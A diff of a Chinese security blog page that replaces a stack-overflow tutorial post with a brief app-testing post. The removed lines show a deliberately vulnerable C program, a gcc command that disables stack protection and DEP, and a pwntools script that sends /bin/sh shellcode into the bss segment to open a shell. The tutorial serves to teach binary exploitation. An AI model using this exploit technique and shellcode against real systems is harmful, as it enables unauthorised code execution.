@@ -4,14 +4,9 @@
 
 <head><meta name="generator" content="Hexo 3.8.0">
     <meta charset="utf-8">
-    <meta name="keywords" content="栈溢出（二）, 妖窝">
-    <meta name="description" content="这次与上一篇文章的不同的是，原代码中没有自带的恶意代码，这时候我们就要考虑自己填塞一段恶意代码以达到目的。
-　　源程序代码如下：     
-#include&amp;lt;stdio.h&gt;
-char str[100];
-void vul()
-{
- ">
+    <meta name="keywords" content="App测试的一些常用测试点分享, 妖窝">
+    <meta name="description" content="划重点！！！本着早期“黑客要有共享精神”和现在“安全人员技术共享”的原则，将知识分享给大家，一定不要干坏事哟！　
+">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -19,7 +14,7 @@ void vul()
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>栈溢出（二） | 妖窝</title>
+    <title>App测试的一些常用测试点分享 | 妖窝</title>
     <link rel="icon" type="image/jpeg" href="/favicon.jpg">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
@@ -263,13 +258,13 @@ void vul()
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/11.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/8.jpg')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        栈溢出（二）
+                        App测试的一些常用测试点分享
                     </div>
                 </div>
             </div>
@@ -380,8 +375,12 @@ void vul()
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/栈溢出/" target="_blank">
-                                <span class="chip bg-color">栈溢出</span>
+                            <a href="/tags/App测试/" target="_blank">
+                                <span class="chip bg-color">App测试</span>
+                            </a>
+                        
+                            <a href="/tags/渗透测试/" target="_blank">
+                                <span class="chip bg-color">渗透测试</span>
                             </a>
                         
                     </div>
@@ -392,8 +391,8 @@ void vul()
                     <div class="post-cate">
                         <i class="fa fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/二进制安全/" class="post-category" target="_blank">
-                                二进制安全
+                            <a href="/categories/Web安全/" class="post-category" target="_blank">
+                                Web安全
                             </a>
                         
                     </div>
@@ -404,14 +403,14 @@ void vul()
             <div class="post-info">
                 <div class="post-date info-break-policy">
                     <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2019-03-27
+                    2019-09-26
                 </div>
 
                 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        402
+                        45
                     </div>
                     
 
@@ -429,51 +428,7 @@ void vul()
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h5 id="这次与上一篇文章的不同的是，原代码中没有自带的恶意代码，这时候我们就要考虑自己填塞一段恶意代码以达到目的。"><a href="#这次与上一篇文章的不同的是，原代码中没有自带的恶意代码，这时候我们就要考虑自己填塞一段恶意代码以达到目的。" class="headerlink" title="这次与上一篇文章的不同的是，原代码中没有自带的恶意代码，这时候我们就要考虑自己填塞一段恶意代码以达到目的。"></a>这次与上一篇文章的不同的是，原代码中没有自带的恶意代码，这时候我们就要考虑自己填塞一段恶意代码以达到目的。</h5><a id="more"></a>
-<p>　　源程序代码如下：     </p>
-<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span>
-<span class="token keyword">char</span> str<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-<span class="token keyword">void</span> <span class="token function">vul</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
-<span class="token punctuation">{</span>
-    <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> s<span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span>
-
-<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
-<span class="token punctuation">{</span>
-    <span class="token function">vul</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span>
-</code></pre>
-<p>　　自己填塞恶意代码，容易“跑”，我们需要一块稳定的，持续可用的代码段来供我们使用。这时候首先想到的是<code>bss</code>段，因为<code>bss</code>段通常用来存放程序中未初始化的全局变量，且可读可写。变量一般分为全局变量和局部变量，局部变量的存活时间较短，函数执行完就自动释放了，全局变量则不同，可以被程序内所有的对象或函数引用，相对来说更加稳定，比较适合存放一段恶意代码。<br>　　<code>bss</code>段可读可写不可执行，因此如果我们想进行实验，需要关掉栈保护和数据执行保护，使得<code>bss</code>段的代码变得可以执行。编译命令如下：    </p>
-<pre class=" language-bash"><code class="language-bash">gcc -fno-stack-protector -z execstack -o xxxx xxxx.c
-</code></pre>
-<p>　　<code>-fno-stack-protector</code>用于关掉栈保护，<code>-z execstack</code>用于关掉数据可执行保护（DEP）。攻击脚本代码如下：</p>
-<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
-
-io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./vul"</span><span class="token punctuation">)</span>
-elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./vul"</span><span class="token punctuation">)</span>
-<span class="token comment" spellcheck="true">#io = remote('127.0.0.1', 10001)       #远程</span>
-read_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"read"</span><span class="token punctuation">]</span>
-
-
-payload  <span class="token operator">=</span> <span class="token string">"a"</span> <span class="token operator">*</span> <span class="token number">44</span>
-payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>read_plt<span class="token punctuation">)</span>
-payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0x0804a040</span><span class="token punctuation">)</span>
-payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
-payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0x0804a040</span><span class="token punctuation">)</span>
-payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span>
-
-sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
-io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
-
-
-shellcode <span class="token operator">=</span> <span class="token string">"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"</span>
-
-sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
-io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>
-
-io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
-</code></pre>
+                <h1 id="划重点！！！"><a href="#划重点！！！" class="headerlink" title="划重点！！！"></a>划重点！！！</h1><h2 id="本着早期“黑客要有共享精神”和现在“安全人员技术共享”的原则，将知识分享给大家，一定不要干坏事哟！"><a href="#本着早期“黑客要有共享精神”和现在“安全人员技术共享”的原则，将知识分享给大家，一定不要干坏事哟！" class="headerlink" title="本着早期“黑客要有共享精神”和现在“安全人员技术共享”的原则，将知识分享给大家，一定不要干坏事哟！"></a>本着早期“黑客要有共享精神”和现在“安全人员技术共享”的原则，将知识分享给大家，一定不要干坏事哟！</h2><p><img src="/2019/09/26/app-ce-shi-de-yi-xie-chang-yong-ce-shi-xiang-mu-fen-xiang/APP测试常用测试点.png" alt="APP测试常用测试点">　</p>
 
             </div>
             <hr>
@@ -497,7 +452,7 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
                     </span>
                     <a href="http://windq08.github.io" class="b-link-green">妖窝</a>
                     <i class="fa fa-angle-right fa-lg fa-fw text-color"></i>
-                    <a href="/2019/03/27/zhan-yi-chu-er/" class="b-link-green">栈溢出（二）</a>
+                    <a href="/2019/09/26/app-ce-shi-de-yi-xie-chang-yong-ce-shi-xiang-mu-fen-xiang/" class="b-link-green">App测试的一些常用测试点分享</a>
                 </p>
             </div>
         </div>
@@ -520,41 +475,47 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
         
         <div class="article col s12 m6 overflow-policy" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="fa fa-dot-circle-o"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2019/04/13/zhan-yi-chu-san/">
+                <a href="/2019/09/26/app-ce-shi-de-yi-xie-chang-yong-ce-shi-xiang-mu-fen-xiang/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/16.jpg" class="responsive-img" alt="栈溢出（三）">
+                        <img src="/medias/featureimages/8.jpg" class="responsive-img" alt="App测试的一些常用测试点分享">
                         
-                        <span class="card-title">栈溢出（三）</span>
+                        <span class="card-title">App测试的一些常用测试点分享</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
-                    <div class="summary">        
-一、了解一下libc　　libc动态链接库中的函数被广泛使用，所以有大概率可以在内存中找到libc动态库。该库内包含了一些系统级的函数，比如system()，所以可以尝试用这些系统级的函数取得控制权。再比如，这样的参数有可</div>
+                    <div class="summary">划重点！！！本着早期“黑客要有共享精神”和现在“安全人员技术共享”的原则，将知识分享给大家，一定不要干坏事哟！　
+</div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="fa fa-clock-o fa-fw icon-date"></i>2019-04-13
-                        </span>
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-09-26
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/二进制安全/" class="post-category" target="_blank">
-                                    二进制安全
+                            <a href="/categories/Web安全/" class="post-category" target="_blank">
+                                    Web安全
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/栈溢出/" target="_blank">
-                        <span class="chip bg-color">栈溢出</span>
+                    <a href="/tags/App测试/" target="_blank">
+                        <span class="chip bg-color">App测试</span>
+                    </a>
+                    
+                    <a href="/tags/渗透测试/" target="_blank">
+                        <span class="chip bg-color">渗透测试</span>
                     </a>
                     
                 </div>
@@ -568,28 +529,28 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
                 下一篇&nbsp;<i class="fa fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2019/03/25/zhan-yi-chu-yi/">
+                <a href="/2019/07/22/xss/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/7.jpg" class="responsive-img" alt="栈溢出（一）">
+                        <img src="/medias/featureimages/8.jpg" class="responsive-img" alt="XSS">
                         
-                        <span class="card-title">栈溢出（一）</span>
+                        <span class="card-title">XSS</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
-                    <div class="summary">开学第一周接触的，最简单的栈溢出学习，基本属于原理级别，后面涉及一点延迟绑定知识。        
-一、栈溢出的概念　　首先我们要知道在计算机内部，一块内存的地址是连续的，是上下连贯的。其次，程序在运行过程中，为了临时存取数据的需要，一般都</div>
+                    <div class="summary">最近在挖洞实战，整个渗透的流程已经总结得差不多了，发掘一个新的漏洞肯定还是有难度，但已经出现过的经典漏洞是不能掌握得不好的，这篇文章用来记录对XSS的学习。
+XSS的基础知识XSS定义　　XSS（跨站脚本攻击），恶意攻击者往Web页面里插入</div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-03-25
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-07-22
                             </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/二进制安全/" class="post-category" target="_blank">
-                                    二进制安全
+                            <a href="/categories/Web安全/" class="post-category" target="_blank">
+                                    Web安全
                                 </a>
                             
                             
@@ -599,8 +560,16 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/栈溢出/" target="_blank">
-                        <span class="chip bg-color">栈溢出</span>
+                    <a href="/tags/Web安全/" target="_blank">
+                        <span class="chip bg-color">Web安全</span>
+                    </a>
+                    
+                    <a href="/tags/经典漏洞/" target="_blank">
+                        <span class="chip bg-color">经典漏洞</span>
+                    </a>
+                    
+                    <a href="/tags/XSS/" target="_blank">
+                        <span class="chip bg-color">XSS</span>
                     </a>
                     
                 </div>
